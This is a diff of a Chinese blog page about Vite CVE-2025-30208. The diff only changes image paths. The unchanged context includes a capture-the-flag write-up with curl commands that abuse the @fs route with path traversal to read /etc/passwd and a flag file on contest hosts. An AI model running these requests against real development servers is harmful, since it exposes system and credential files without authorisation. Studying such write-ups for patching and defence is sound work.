@@ -16,12 +16,12 @@
 <meta property="og:site_name" content="Zbaoabo">
 <meta property="og:description" content="Vite CVE-2025-30208 安全漏洞[TOc] 一、漏洞概述CVE-2025-30208 是 Vite（一个前端开发工具提供商）在特定版本中存在的安全漏洞。此漏洞允许攻击者通过特殊的 URL 参数绕过对文件系统的访问限制，从而获取任意文件内容（包括非 Vite 服务目录范围外的文件）。 1.漏洞原理 Vite 在开发服务器模式下提供了 @fs 用于访问服务允许范围内的文件。 本应对超出">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/ViteCVE/image-20250421203653806.png">
+<meta property="og:image" content="http://example.com/image-20250421203653806.png">
 <meta property="article:published_time" content="2025-04-21T12:08:17.882Z">
 <meta property="article:modified_time" content="2025-04-21T12:38:23.856Z">
 <meta property="article:author" content="zhangsuhong">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/ViteCVE/image-20250421203653806.png">
+<meta name="twitter:image" content="http://example.com/image-20250421203653806.png">
   
     <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
   
@@ -232,7 +232,7 @@
 <p>###TGCTF WEB-前端GAME Ultra</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">访问/@fs/tmp/获得绝对路径/app，同时给了附件看docker也能看出路径</span><br><span class="line">curl --request-target /@fs/app/#/../../../../../etc/passwd </span><br><span class="line">http://node1.tgctf.woooo.tech:32742/</span><br><span class="line"> curl --request-target /@fs/app/#/../../../../../tgflagggg </span><br><span class="line">http://node2.tgctf.woooo.tech:31500/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/ViteCVE/image-20250421203653806.png" alt="image-20250421203653806"></p>
+<p><img src="/image-20250421203653806.png" alt="image-20250421203653806"></p>
 
       
     </div>
